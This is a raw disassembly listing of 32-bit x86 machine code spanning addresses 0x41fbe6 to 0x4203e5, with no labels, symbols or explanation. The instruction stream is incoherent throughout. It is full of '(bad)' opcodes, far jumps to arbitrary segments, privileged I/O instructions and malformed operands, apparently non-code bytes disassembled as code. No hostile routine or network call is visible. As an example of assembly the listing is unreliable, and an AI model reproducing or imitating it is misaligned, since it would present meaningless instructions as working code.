  41fbe6:	mov    ecx,0x5d140180
  41fbeb:	retf   
  41fbec:	loop   0x41fbe9
  41fbee:	ins    BYTE PTR es:[edi],dx
  41fbef:	mov    ebp,edi
  41fbf1:	cwde   
  41fbf2:	sti    
  41fbf3:	mov    bl,ah
  41fbf5:	push   ss
  41fbf6:	ja     0x41fb96
  41fbf8:	rcl    DWORD PTR [edi+0x4624d374],1
  41fbfe:	push   ebp
  41fbff:	pop    ecx
  41fc00:	(bad)  
  41fc01:	cmp    al,0xc3
  41fc03:	mov    ecx,0xb8fab094
  41fc08:	inc    ebx
  41fc09:	pop    ebx
  41fc0a:	sbb    BYTE PTR [eax-0x65],dh
  41fc0d:	pop    edx
  41fc0e:	mov    esp,0x17eef4e7
  41fc13:	jp     0x41fc43
  41fc15:	out    0x61,al
  41fc17:	and    al,0x6f
  41fc19:	aaa    
  41fc1a:	cli    
  41fc1b:	imul   DWORD PTR ds:0xba092ffd
  41fc21:	fidiv  DWORD PTR [edi+0x2]
  41fc24:	adc    eax,0xbebf09b6
  41fc29:	lock jge 0x41fc21
  41fc2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc2d:	arpl   WORD PTR [eax-0x5e],si
  41fc30:	inc    ebp
  41fc31:	jno    0x41fbdd
  41fc33:	mov    DWORD PTR [ebx+esi*4],edx
  41fc36:	jnp    0x41fc73
  41fc38:	inc    eax
  41fc39:	jbe    0x41fbfa
  41fc3b:	sub    dh,dl
  41fc3d:	mov    ah,0x87
  41fc3f:	cmp    ebx,DWORD PTR [ecx-0x7b]
  41fc42:	loop   0x41fc0f
  41fc44:	jbe    0x2937a4d2
  41fc4a:	pop    eax
  41fc4b:	mov    esi,0x4a43dfdf
  41fc50:	arpl   WORD PTR [eax-0x1bdc148a],ax
  41fc56:	push   esi
  41fc57:	push   es
  41fc58:	stos   BYTE PTR es:[edi],al
  41fc59:	mov    ax,WORD PTR [ebx]
  41fc5c:	clc    
  41fc5d:	xchg   ebx,eax
  41fc5e:	rol    BYTE PTR [ecx],1
  41fc60:	mov    edi,0xfcc94b08
  41fc65:	hlt    
  41fc66:	jg     0x41fc7c
  41fc68:	ret    
  41fc69:	fcmovu st,st(3)
  41fc6b:	jmp    0x187d8440
  41fc70:	ficomp DWORD PTR [edx]
  41fc72:	mov    dl,0x29
  41fc74:	pop    eax
  41fc75:	fld    QWORD PTR [ebx+ebx*1]
  41fc78:	mov    DWORD PTR [ecx+edx*8],esp
  41fc7b:	(bad)  
  41fc7c:	pop    esi
  41fc7d:	add    edx,DWORD PTR [ecx]
  41fc7f:	sbb    eax,0x67b81774
  41fc84:	and    BYTE PTR es:[ebp+0x74],0x16
  41fc89:	xor    edi,DWORD PTR [ebx]
  41fc8b:	jle    0x41fcad
  41fc8d:	push   edi
  41fc8e:	lock add BYTE PTR [eax+ebp*1],bh
  41fc92:	mov    DWORD PTR [esi+0x1a],ebp
  41fc95:	fsubr  QWORD PTR [eax+eax*1+0x0]
	...
  41fd14:	xchg   edi,edx
  41fd16:	dec    ebp
  41fd17:	jnp    0x41fd76
  41fd19:	sti    
  41fd1a:	mov    bh,0xff
  41fd1c:	ds aad 0x54
  41fd1f:	ret    0xae16
  41fd22:	stc    
  41fd23:	mov    edi,0x1964c
  41fd28:	imul   eax,DWORD PTR [edi],0x0
  41fd2b:	add    BYTE PTR [esi],cl
  41fd2d:	pop    ss
  41fd2e:	adc    edx,DWORD PTR [ecx-0x6e1977aa]
  41fd34:	jecxz  0x41fda0
  41fd36:	mov    cl,0x40
  41fd38:	and    al,0x28
  41fd3a:	test   eax,0xcda95d8a
  41fd3f:	pop    DWORD PTR [edx-0x15]
  41fd42:	rcl    DWORD PTR [ebp+0x6cfb79b5],1
  41fd48:	jno    0x41fcd3
  41fd4a:	push   ds
  41fd4b:	mov    ?,WORD PTR [edx-0x64]
  41fd4e:	pop    esp
  41fd4f:	sbb    edx,ebp
  41fd51:	neg    DWORD PTR [ecx]
  41fd53:	mov    bh,0x9d
  41fd55:	mov    dh,0x1
  41fd57:	jmp    0xe86d:0x9f1faa16
  41fd5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd5f:	add    BYTE PTR [ebx-0x5c],0x1a
  41fd63:	xor    al,0x1d
  41fd65:	pop    esp
  41fd66:	cmc    
  41fd67:	lea    ebp,[ebp-0x70]
  41fd6a:	jo     0x41fdbc
  41fd6c:	dec    edi
  41fd6d:	inc    edx
  41fd6e:	push   esp
  41fd6f:	lods   eax,DWORD PTR ds:[esi]
  41fd70:	pop    ebx
  41fd71:	sti    
  41fd72:	out    0x2e,al
  41fd74:	push   0xffffffa6
  41fd76:	(bad)  
  41fd77:	mov    WORD PTR [edi+0x2b],cs
  41fd7a:	and    eax,0x27c0d399
  41fd7f:	mul    DWORD PTR ds:0x75bf5385
  41fd85:	test   al,0xbb
  41fd87:	in     eax,dx
  41fd88:	les    esi,FWORD PTR [ebx]
  41fd8a:	out    0x86,eax
  41fd8c:	loopne 0x41fdbf
  41fd8e:	mov    eax,ds:0xeb6ad75e
  41fd93:	repz inc edx
  41fd95:	push   0x6d46d8de
  41fd9a:	sub    eax,DWORD PTR [edx-0x28]
  41fd9d:	mov    edx,esi
  41fd9f:	jmp    0xc767:0xf4156f74
  41fda6:	add    bh,cl
  41fda8:	sub    al,0xa5
  41fdaa:	outs   dx,DWORD PTR ds:[esi]
  41fdab:	call   ebx
  41fdad:	mov    DWORD PTR [ebx-0x77],ebp
  41fdb0:	or     DWORD PTR [ebp+0x69],0x3b8fe6db
  41fdb7:	aaa    
  41fdb8:	daa    
  41fdb9:	add    edi,esi
  41fdbb:	mov    al,0xfb
  41fdbd:	dec    edi
  41fdbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdbf:	fcom   DWORD PTR [ebx]
  41fdc1:	mov    ebp,0x748d79d7
  41fdc6:	xchg   BYTE PTR [esi],ah
  41fdc8:	ins    DWORD PTR es:[edi],dx
  41fdc9:	mov    dh,0xfc
  41fdcb:	(bad)  
  41fdcc:	cmp    eax,DWORD PTR [ebx+0x7a]
  41fdcf:	mov    eax,ds:0xb54379b0
  41fdd4:	and    bh,BYTE PTR [eax-0x4bd3d4b4]
  41fdda:	fistp  DWORD PTR es:[ecx]
  41fddd:	shr    DWORD PTR [eax+0x73],0xf9
  41fde1:	out    dx,al
  41fde2:	xor    DWORD PTR [esi-0x2f8d56b3],ecx
  41fde8:	or     eax,0xde63e0ef
  41fded:	pop    eax
  41fdee:	xchg   edi,eax
  41fdef:	fld    DWORD PTR [edi-0x46]
  41fdf2:	lds    edx,FWORD PTR [esi+edx*4+0x17a4a16f]
  41fdf9:	inc    eax
  41fdfa:	pop    edx
  41fdfb:	sbb    ah,BYTE PTR [edx]
  41fdfd:	mov    ds:0xea42ccf7,al
  41fe02:	hlt    
  41fe03:	ret    
  41fe04:	clc    
  41fe05:	mov    eax,ds:0xdd893fb
  41fe0a:	inc    ecx
  41fe0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe0d:	or     ah,BYTE PTR [edx-0x1e55dc66]
  41fe13:	jb     0x41fdde
  41fe15:	xor    al,0x2
  41fe17:	ss ja  0x41fe91
  41fe1a:	test   cl,0x24
  41fe1d:	adc    eax,0x8452f858
  41fe22:	in     eax,dx
  41fe23:	retf   0xf636
  41fe26:	push   esi
  41fe27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe28:	stos   DWORD PTR es:[edi],eax
  41fe29:	dec    esi
  41fe2a:	clc    
  41fe2b:	push   cs
  41fe2c:	test   DWORD PTR [edi],eax
  41fe2e:	add    ah,bh
  41fe30:	sub    BYTE PTR [edx+0x56de764f],dl
  41fe36:	arpl   WORD PTR [ebp+0x4ab02df],bx
  41fe3c:	fwait
  41fe3d:	cmp    ch,BYTE PTR [esi]
  41fe3f:	mov    bl,0x9
  41fe41:	jbe    0x41fe55
  41fe43:	dec    eax
  41fe44:	inc    edi
  41fe45:	cmp    dl,ch
  41fe47:	in     eax,0x83
  41fe49:	push   es
  41fe4a:	fistp  DWORD PTR [ebp+0x72e589e0]
  41fe50:	ds cld 
  41fe52:	fcmovu st,st(6)
  41fe54:	adc    DWORD PTR fs:0x69f23b4a,esp
  41fe5b:	lds    esp,FWORD PTR [ebx-0x14]
  41fe5e:	xor    eax,0x8901a4f7
  41fe63:	or     ah,ch
  41fe65:	int3   
  41fe66:	xor    DWORD PTR [edi+0x79],eax
  41fe69:	push   es
  41fe6a:	jb     0x41fe50
  41fe6c:	mov    ecx,0xf0803333
  41fe71:	or     dl,BYTE PTR [edx-0x4a7e9332]
  41fe77:	and    cl,BYTE PTR [ecx-0x62be6bc]
  41fe7d:	leave  
  41fe7e:	in     al,dx
  41fe7f:	adc    BYTE PTR [ecx+0x1f],bh
  41fe82:	stc    
  41fe83:	dec    ecx
  41fe84:	imul   BYTE PTR [edx]
  41fe86:	pushf  
  41fe87:	sub    ecx,DWORD PTR ds:0xb7ad3f26
  41fe8d:	(bad)
  41fe91:	stc    
  41fe92:	jge    0x41fecc
  41fe94:	add    eax,edx
  41fe96:	add    al,0x91
  41fe98:	(bad)  
  41fe9a:	(bad)  
  41fe9b:	out    0xe9,eax
  41fe9d:	jnp    0x41fe59
  41fe9f:	lods   eax,DWORD PTR ds:[esi]
  41fea0:	neg    BYTE PTR [ebx+ecx*2-0x70]
  41fea4:	jb     0x41fe8d
  41fea6:	(bad)  
  41fea7:	mov    ds,WORD PTR [edi-0x4f]
  41feaa:	mov    eax,0xfaf41af5
  41feaf:	sub    DWORD PTR [ebx-0x50],0xffffffe8
  41feb3:	xchg   edx,eax
  41feb4:	or     DWORD PTR [eax],eax
  41feb6:	sub    eax,0xddbbc2f9
  41febb:	mov    ecx,0xa55d71ab
  41fec0:	lahf   
  41fec1:	shl    DWORD PTR [edi],1
  41fec3:	mov    bh,0x26
  41fec5:	push   es
  41fec6:	out    0xcb,eax
  41fec8:	fwait
  41fec9:	or     al,0x9
  41fecb:	pop    edi
  41fecd:	sti    
  41fece:	dec    edx
  41fecf:	ret    0x72ae
  41fed2:	mov    al,0xa
  41fed4:	les    edx,FWORD PTR [ebp+eiz*8-0x1324718]
  41fedb:	sub    DWORD PTR [ebp+0x762e6d2d],0x4ba0bd54
  41fee5:	sti    
  41fee6:	sub    DWORD PTR [esi-0x66],ebx
  41fee9:	in     eax,dx
  41feea:	ret    
  41feeb:	xlat   BYTE PTR ds:[ebx]
  41feec:	cmp    al,0xf6
  41feee:	xor    edi,eax
  41fef0:	rcl    DWORD PTR [ebx-0x7a1793fa],1
  41fef6:	jp     0x41fe83
  41fef8:	push   0x20658a11
  41fefd:	adc    al,0x8b
  41feff:	cmp    ebp,esi
  41ff01:	and    ecx,DWORD PTR [bx+0x4a42]
  41ff06:	add    ebp,DWORD PTR [eax+ebx*4+0x47]
  41ff0a:	rol    BYTE PTR [esi],0xda
  41ff0d:	icebp  
  41ff0e:	or     al,0x2b
  41ff10:	push   edx
  41ff11:	int    0xc0
  41ff13:	(bad)  
  41ff15:	retf   0x7c4a
  41ff18:	aas    
  41ff19:	mov    ecx,0x531fd088
  41ff1e:	xor    al,0x96
  41ff20:	adc    al,0xe4
  41ff22:	and    BYTE PTR [ebp-0x41],dh
  41ff25:	arpl   si,sp
  41ff27:	ins    DWORD PTR es:[edi],dx
  41ff28:	adc    al,0x67
  41ff2a:	pop    ecx
  41ff2b:	dec    esi
  41ff2c:	cmp    DWORD PTR [edx-0x11634669],edx
  41ff32:	push   ebp
  41ff33:	aam    0xe9
  41ff35:	push   ds
  41ff36:	adc    BYTE PTR [esi],dl
  41ff38:	cwde   
  41ff39:	cdq    
  41ff3a:	ss sbb al,0x27
  41ff3d:	into   
  41ff3e:	jmp    0x41ff8a
  41ff40:	lods   eax,DWORD PTR ds:[esi]
  41ff41:	scas   eax,DWORD PTR es:[edi]
  41ff42:	dec    esp
  41ff43:	mov    eax,ds:0x5cc9d545
  41ff48:	addr16 aaa 
  41ff4a:	or     eax,0xfd56b5cd
  41ff4f:	cdq    
  41ff50:	push   ds
  41ff51:	and    DWORD PTR [ebx-0x6a],edi
  41ff54:	xor    al,0xe4
  41ff56:	(bad)  
  41ff57:	pop    esp
  41ff58:	pop    edi
  41ff59:	adc    eax,0x4bbc9937
  41ff5e:	(bad)  
  41ff5f:	mov    ds:0xda66764b,eax
  41ff64:	mov    ds:0xd1e2edbd,al
  41ff69:	sub    ebp,DWORD PTR [esi-0x35fec3d7]
  41ff6f:	retf   0x2fdd
  41ff72:	xchg   edi,eax
  41ff73:	das    
  41ff74:	imul   edx,DWORD PTR [edi-0x36],0xa405e779
  41ff7b:	in     eax,0x28
  41ff7d:	mov    ecx,ebx
  41ff7f:	jne    0x41ffd9
  41ff81:	cmp    DWORD PTR [esi+0x5d],edx
  41ff84:	xchg   esp,eax
  41ff85:	pop    eax
  41ff86:	sbb    BYTE PTR [ebp+0x12439d2e],0x12
  41ff8d:	mov    eax,ds:0xce34bee1
  41ff92:	es xchg esp,eax
  41ff94:	retf   
  41ff95:	add    eax,0x65b31f23
  41ff9a:	daa    
  41ff9b:	lods   eax,DWORD PTR ds:[esi]
  41ff9c:	cmp    edi,DWORD PTR [eax]
  41ff9e:	repz popf 
  41ffa0:	lock cwde 
  41ffa2:	mov    ecx,DWORD PTR [eax+0x137a55c7]
  41ffa8:	fst    QWORD PTR [eax-0x59]
  41ffab:	aaa    
  41ffac:	(bad)  
  41ffad:	lahf   
  41ffae:	fimul  DWORD PTR [ebx-0x111e1fde]
  41ffb4:	fstp   DWORD PTR [edx+0x4d]
  41ffb7:	xchg   ebx,eax
  41ffb8:	imul   eax,DWORD PTR [eax+0x16],0x40
  41ffbc:	pop    ds
  41ffbd:	(bad)  
  41ffbe:	cwde   
  41ffbf:	jns    0x41fffc
  41ffc1:	mov    cl,0x4e
  41ffc3:	sbb    esi,ebp
  41ffc5:	xchg   ebp,eax
  41ffc6:	sub    ebp,eax
  41ffc8:	sbb    BYTE PTR [edi],bh
  41ffca:	xchg   edx,eax
  41ffcb:	sbb    BYTE PTR [edi-0x47],0xc5
  41ffcf:	adc    al,0xd
  41ffd1:	leave  
  41ffd2:	fld    TBYTE PTR [edx+0x3958a465]
  41ffd8:	retf   
  41ffd9:	je     0x41ffd6
  41ffdb:	(bad)  
  41ffdc:	ja     0x41ff74
  41ffde:	fucomip st,st(6)
  41ffe0:	ret    0xff1f
  41ffe3:	mov    ds:0x734840a1,al
  41ffe8:	out    0x2,eax
  41ffea:	sbb    eax,ebx
  41ffec:	mov    ebp,0xce62c510
  41fff1:	int3   
  41fff2:	sub    bl,al
  41fff4:	add    BYTE PTR ds:0xa65f1d7,bl
  41fffa:	sub    DWORD PTR [ebp+0x3],edx
  41fffd:	sub    al,0x9c
  41ffff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420000:	dec    ebx
  420001:	jmp    0x38ed:0xa9b1daef
  420008:	jmp    0xfb64:0xf88ac98f
  42000f:	inc    ebx
  420010:	pop    esi
  420011:	inc    ebx
  420012:	ins    BYTE PTR es:[edi],dx
  420013:	call   0x39d1:0xe79a7494
  42001a:	(bad)  
  42001b:	jp     0x42002c
  42001d:	out    0xd0,al
  42001f:	mov    ?,WORD PTR [edi+ecx*4+0x2d]
  420023:	push   0xffffffa0
  420025:	xchg   ebp,eax
  420026:	jge    0x420083
  420028:	mov    edx,0x47d5ecf9
  42002d:	push   eax
  42002e:	xchg   esp,eax
  42002f:	leave  
  420030:	and    ebp,edi
  420032:	or     BYTE PTR [edi],al
  420034:	int3   
  420035:	jnp    0x4200a2
  420037:	cmp    bl,BYTE PTR [eax]
  420039:	or     BYTE PTR [ecx-0x3f],dh
  42003c:	outs   dx,DWORD PTR ds:[esi]
  42003d:	aaa    
  42003e:	fisttp WORD PTR [ecx]
  420040:	daa    
  420041:	pop    eax
  420042:	out    dx,al
  420043:	fmul   QWORD PTR [eax]
  420045:	dec    esp
  420046:	call   0xa355:0xe2f96cf8
  42004d:	xlat   BYTE PTR ds:[ebx]
  42004e:	into   
  42004f:	xor    DWORD PTR [edx-0x6e9a77eb],eax
  420055:	ja     0x420071
  420057:	pop    esi
  420058:	sub    eax,0x4790af84
  42005d:	pop    eax
  42005e:	push   esp
  42005f:	popa   
  420060:	mov    ah,0x35
  420062:	das    
  420063:	stos   DWORD PTR es:[edi],eax
  420064:	iret   
  420065:	gs in  ax,0xff
  420069:	or     BYTE PTR [ebx],dl
  42006b:	cmp    esi,esi
  42006d:	dec    esi
  42006e:	ins    BYTE PTR es:[edi],dx
  42006f:	or     al,BYTE PTR [edi-0x6]
  420072:	out    dx,al
  420073:	push   esi
  420074:	loop   0x420025
  420076:	jb     0x420048
  420078:	xor    edi,ecx
  42007a:	sub    al,0x3c
  42007c:	imul   esp
  42007e:	jmp    0x38e31df7
  420083:	in     eax,dx
  420084:	push   esi
  420085:	jb     0x42002b
  420087:	mov    DWORD PTR [eax+0x6f],ecx
  42008a:	lock add BYTE PTR [ebx-0x58],cl
  42008e:	adc    cl,dh
  420090:	scas   eax,DWORD PTR es:[edi]
  420091:	mov    ebp,DWORD PTR [edx-0x26]
  420094:	mov    esp,0x759b6d3f
  420099:	dec    esp
  42009a:	jp     0x4200a8
  42009c:	pop    ss
  42009d:	push   eax
  42009e:	mov    edx,0x89f55e80
  4200a3:	inc    edx
  4200a4:	xor    al,BYTE PTR [edx+0x3d]
  4200a7:	add    al,0xe4
  4200a9:	jb     0x420114
  4200ab:	cdq    
  4200ac:	push   ds
  4200ad:	jmp    0x2ca4c9c6
  4200b2:	mov    cl,bh
  4200b4:	adc    al,0x60
  4200b6:	out    dx,eax
  4200b7:	ror    esi,0xae
  4200ba:	addr16 imul edi,ebx,0x729e5283
  4200c1:	mov    ch,0x72
  4200c3:	fstp   QWORD PTR [ebx+ebx*1]
  4200c6:	or     DWORD PTR [esp+esi*4],esi
  4200c9:	cmp    al,0xe6
  4200cb:	xor    DWORD PTR [ebx+eiz*4+0x26ca72ad],ecx
  4200d2:	add    dl,BYTE PTR [eax]
  4200d4:	(bad)  
  4200d6:	jo     0x420067
  4200d8:	jbe    0x420067
  4200da:	loope  0x4200ae
  4200dc:	mov    BYTE PTR [esi+ebp*2-0x1e],dl
  4200e0:	xchg   BYTE PTR gs:[esi],al
  4200e3:	int3   
  4200e4:	(bad)  
  4200e5:	cmc    
  4200e6:	pusha  
  4200e7:	add    bh,ah
  4200e9:	fadd   DWORD PTR [edi]
  4200eb:	out    0x46,al
  4200ed:	loopne 0x420088
  4200ef:	push   ecx
  4200f0:	sar    BYTE PTR [edi],1
  4200f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f3:	popf   
  4200f4:	sbb    eax,0x68c92e2b
  4200f9:	sbb    al,0xea
  4200fb:	loopne 0x420129
  4200fd:	pusha  
  4200fe:	(bad)  
  4200ff:	call   0x748f5f6f
  420104:	enter  0xb509,0xed
  420108:	pusha  
  420109:	adc    eax,0x9a29b034
  42010e:	dec    ebx
  42010f:	inc    esi
  420110:	adc    bh,dh
  420112:	and    BYTE PTR [esp+ebx*4+0x78],bh
  420116:	dec    edx
  420117:	aaa    
  420118:	aad    0xf
  42011a:	cmp    BYTE PTR [ecx],ah
  42011c:	jno    0x420104
  42011e:	int3   
  42011f:	or     esp,DWORD PTR [esi-0x80]
  420122:	sbb    DWORD PTR ds:0x6a92b44e,esp
  420128:	mov    ds:0x704bfba0,eax
  42012d:	sbb    ah,BYTE PTR [esi-0x45]
  420130:	repz push ecx
  420132:	shl    ecx,0x7f
  420135:	pcmpeqd mm4,QWORD PTR [edi+0x38]
  420139:	add    ebx,DWORD PTR [eax+0x48]
  42013c:	jle    0x42010a
  42013e:	xchg   edi,eax
  42013f:	push   edx
  420140:	add    DWORD PTR es:[ebp+0x67],edi
  420144:	mov    ch,0x96
  420146:	and    al,bh
  420148:	lock pop ebp
  42014a:	test   BYTE PTR ds:0x644b2b1c,bh
  420150:	jb     0x4200df
  420152:	sbb    edi,DWORD PTR [edi+0x33]
  420155:	and    eax,0x88fe0958
  42015a:	inc    esi
  42015b:	ds push ss
  42015d:	fiadd  WORD PTR [edx-0x6606e4b2]
  420163:	and    DWORD PTR [esp+ecx*8-0x22],esi
  420167:	loopne 0x4201c8
  420169:	sar    DWORD PTR [ebx-0x637c80c9],0x3e
  420170:	(bad)  
  420171:	fwait
  420172:	and    eax,0xd9f2901d
  420177:	dec    dh
  420179:	sbb    dl,BYTE PTR [esi+0x3d62be79]
  42017f:	push   esp
  420180:	ret    0xeef7
  420183:	cmp    bl,ah
  420185:	cmp    BYTE PTR [ecx+0x26],ah
  420188:	int    0xd6
  42018a:	repz adc eax,0x9dd4dc6d
  420190:	push   ecx
  420191:	jle    0x420198
  420193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420194:	adc    ah,0x74
  420197:	or     BYTE PTR [ecx],dh
  420199:	inc    ebx
  42019a:	out    dx,al
  42019b:	sar    DWORD PTR es:[eax+0x6c],cl
  42019f:	push   ecx
  4201a0:	cld    
  4201a1:	std    
  4201a2:	jo     0x42019a
  4201a4:	mov    esi,ecx
  4201a6:	mov    dl,0x9c
  4201a8:	icebp  
  4201a9:	jno    0x42021e
  4201ab:	pop    ss
  4201ac:	mov    al,0x82
  4201ae:	(bad)  
  4201af:	fwait
  4201b0:	push   0x76aac0a
  4201b5:	sbb    BYTE PTR [esi-0x3fc32750],dh
  4201bb:	add    edx,ebp
  4201bd:	lods   eax,DWORD PTR ds:[esi]
  4201be:	rcr    DWORD PTR [edi+0x53e6433f],cl
  4201c4:	in     al,0x72
  4201c6:	in     eax,dx
  4201c7:	pop    es
  4201c8:	cmp    ebx,DWORD PTR [esi]
  4201ca:	xchg   eax,ecx
  4201cc:	int    0x91
  4201ce:	cli    
  4201cf:	mov    bl,0xd
  4201d1:	xchg   ecx,eax
  4201d2:	mov    esp,0x35ff7c28
  4201d7:	data16 mov WORD PTR [eax-0x31ff6522],es
  4201de:	sbb    BYTE PTR [edi-0x23],ah
  4201e1:	jg     0x420248
  4201e3:	fist   DWORD PTR [ecx+0x6a]
  4201e6:	mov    eax,0x9540afe9
  4201eb:	shl    DWORD PTR [esi+esi*8],1
  4201ee:	ret    0x3d16
  4201f1:	dec    edx
  4201f2:	jmp    0xb744a506
  4201f7:	add    eax,0x7d8b4755
  4201fc:	adc    dl,0xa4
  4201ff:	addr16 mov dh,0x95
  420202:	aaa    
  420203:	int    0x5e
  420205:	mov    ch,0x6c
  420207:	push   0xa025d27b
  42020c:	repnz mov ebx,ecx
  42020f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420210:	xchg   esi,eax
  420211:	jl     0x420225
  420213:	mov    ecx,0xfbdf54c1
  420218:	xchg   esi,eax
  420219:	shl    DWORD PTR [ebp-0x132f934d],cl
  42021f:	jg     0x4201e7
  420221:	test   DWORD PTR [esi+ebp*4-0x4d],edx
  420225:	aam    0x99
  420227:	data16 jb 0x4201e2
  42022a:	mov    esp,0x2b69663b
  42022f:	int3   
  420230:	jmp    0x420248
  420232:	mov    eax,0xf0648b9a
  420237:	pop    ss
  420238:	scas   eax,DWORD PTR es:[edi]
  420239:	sub    BYTE PTR [edx+edi*4+0x490f5949],bh
  420240:	mov    ds:0x8fee2e0a,al
  420245:	sub    DWORD PTR [eax+0x5d0bea33],ecx
  42024b:	mov    bl,0xfa
  42024d:	hlt    
  42024e:	xchg   esi,eax
  42024f:	(bad)  
  420250:	mov    dh,0xea
  420252:	ds cmp esp,ebx
  420255:	mov    dh,0xa8
  420257:	mov    bl,0xbc
  420259:	cmc    
  42025a:	sub    eax,0x759bc2f6
  42025f:	in     al,dx
  420260:	or     dl,BYTE PTR [ebx]
  420262:	outs   dx,DWORD PTR ds:[esi]
  420263:	rol    BYTE PTR [esi],cl
  420265:	int    0x9b
  420267:	popa   
  420268:	pop    edx
  420269:	inc    esi
  42026a:	inc    BYTE PTR [ebx+0x65a1284b]
  420270:	pop    edx
  420271:	xchg   edx,eax
  420272:	pushf  
  420273:	and    eax,0x727bcbc7
  420278:	pop    ecx
  420279:	dec    bx
  42027b:	xchg   edx,edi
  42027d:	ins    BYTE PTR es:[edi],dx
  42027e:	out    dx,al
  42027f:	ss into 
  420281:	rol    BYTE PTR [esi-0x707fe7cd],cl
  420287:	xchg   ecx,eax
  420288:	lods   al,BYTE PTR ds:[esi]
  420289:	sbb    edi,DWORD PTR [ebx]
  42028b:	mov    ds:0x2f589b14,al
  420290:	jmp    0x564a:0x959fe747
  420297:	xchg   DWORD PTR [edi+0x44674b0f],esp
  42029d:	retf   
  42029e:	(bad)  
  42029f:	jae    0x420237
  4202a1:	test   DWORD PTR [eax],0xf18c0379
  4202a7:	sub    BYTE PTR [ebx+0xad8605c],0x56
  4202ae:	jmp    0x56786805
  4202b3:	gs loopne 0x42024a
  4202b6:	dec    ebp
  4202b7:	icebp  
  4202b8:	inc    eax
  4202b9:	call   0x8022f8b8
  4202be:	mov    al,0x94
  4202c0:	out    dx,eax
  4202c1:	and    DWORD PTR [edx-0x3a],ebx
  4202c4:	shl    bl,1
  4202c6:	mul    BYTE PTR gs:[esi+0x6053771d]
  4202cd:	xor    eax,eax
  4202cf:	fwait
  4202d0:	add    bl,BYTE PTR [edx+0xe]
  4202d3:	cli    
  4202d4:	out    0xee,al
  4202d6:	cmp    al,0xf6
  4202d8:	xchg   edx,eax
  4202d9:	xor    esp,eax
  4202db:	dec    ebp
  4202dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202dd:	dec    esi
  4202de:	cmp    eax,0x51fe19f0
  4202e3:	fdivr  QWORD PTR [eax]
  4202e5:	mov    ebp,0xccc37548
  4202ea:	xor    esi,ebx
  4202ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202ed:	or     DWORD PTR [ebx],eax
  4202ef:	sbb    ah,dl
  4202f1:	hlt    
  4202f2:	mov    ch,0x16
  4202f4:	xor    cl,al
  4202f6:	add    dh,dl
  4202f8:	push   ebp
  4202f9:	out    dx,al
  4202fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202fb:	pusha  
  4202fc:	test   al,0x50
  4202fe:	stc    
  4202ff:	mov    ah,0x26
  420301:	shl    BYTE PTR ds:0x5dc15dd2,cl
  420307:	aad    0xf7
  420309:	mov    ecx,0x1aa41318
  42030e:	xor    eax,0xfb6339e9
  420313:	dec    ebx
  420314:	mov    edi,0x5dbe8d9
  420319:	mov    ds,cx
  42031c:	push   esp
  42031d:	ins    BYTE PTR es:[edi],dx
  42031e:	mov    al,ds:0xbffcf6d7
  420323:	pop    edx
  420324:	add    bh,bh
  420326:	mov    bh,0x9a
  420328:	cwde   
  420329:	stc    
  42032a:	fcomp  DWORD PTR [eax+0x2c82d3f4]
  420330:	stos   BYTE PTR es:[edi],al
  420331:	adc    eax,0xdb29437f
  420336:	mov    BYTE PTR [ecx+0x54],0x9e
  42033a:	cmp    eax,0xaf9ab689
  42033f:	lock mov ecx,esi
  420342:	jo     0x420306
  420344:	pop    ecx
  420345:	or     DWORD PTR [ecx+ecx*4],0x1e1fbc22
  42034c:	scas   al,BYTE PTR es:[edi]
  42034d:	and    esi,DWORD PTR [ebp+ecx*1+0x3b]
  420351:	jne    0x420328
  420353:	xor    bh,BYTE PTR [ebx+0x833261e]
  420359:	pop    ebx
  42035a:	lock inc esp
  42035c:	cwde   
  42035d:	dec    esp
  42035e:	popf   
  42035f:	ins    DWORD PTR es:[edi],dx
  420360:	loop   0x42034d
  420362:	scas   eax,DWORD PTR es:[edi]
  420363:	mov    eax,0x8d155a54
  420368:	cmc    
  420369:	wbinvd 
  42036b:	sub    al,BYTE PTR [ebx]
  42036d:	dec    esp
  42036e:	in     eax,dx
  42036f:	mov    cl,BYTE PTR [ebp+0x27]
  420372:	(bad)  
  420373:	daa    
  420374:	ret    0x476f
  420377:	mov    BYTE PTR [edx-0x1aa94666],dl
  42037d:	ins    DWORD PTR es:[edi],dx
  42037e:	jecxz  0x420325
  420380:	aaa    
  420381:	fdivr  DWORD PTR [esp+ecx*2+0x551020b8]
  420388:	fs out 0x17,al
  42038b:	mov    cl,0x5e
  42038d:	jne    0x4203ce
  42038f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420390:	dec    ebx
  420391:	cmp    eax,0xe6d47966
  420396:	out    0x83,al
  420398:	jg     0x4203d1
  42039a:	inc    esi
  42039b:	mov    eax,0x26b36d1a
  4203a0:	add    eax,0x1348aa3c
  4203a5:	aaa    
  4203a6:	cmp    ebx,DWORD PTR [ecx-0x4b6051e4]
  4203ac:	inc    edi
  4203ad:	dec    ebp
  4203ae:	pop    esi
  4203af:	adc    DWORD PTR [edi+0x56],edx
  4203b2:	fisubr WORD PTR [eax+0x388e1238]
  4203b8:	add    al,0x37
  4203ba:	push   esi
  4203bb:	mov    eax,ds:0x373abea3
  4203c0:	dec    DWORD PTR ds:[ebp-0x6]
  4203c4:	daa    
  4203c5:	xchg   ebx,eax
  4203c6:	inc    eax
  4203c7:	or     esi,DWORD PTR [edx-0x70]
  4203ca:	imul   edi,esp,0x72
  4203cd:	ret    
  4203ce:	ret    
  4203cf:	jmp    0x290b46e1
  4203d4:	jae    0x420364
  4203d6:	fsubrp st(0),st
  4203d8:	or     BYTE PTR [edi],bh
  4203da:	cli    
  4203db:	pop    ds
  4203dc:	les    esi,FWORD PTR [edi+0x52f3f2ee]
  4203e2:	sbb    BYTE PTR [ecx],al
  4203e4:	lahf   
  4203e5:	mov    ebp,0x14f2b395
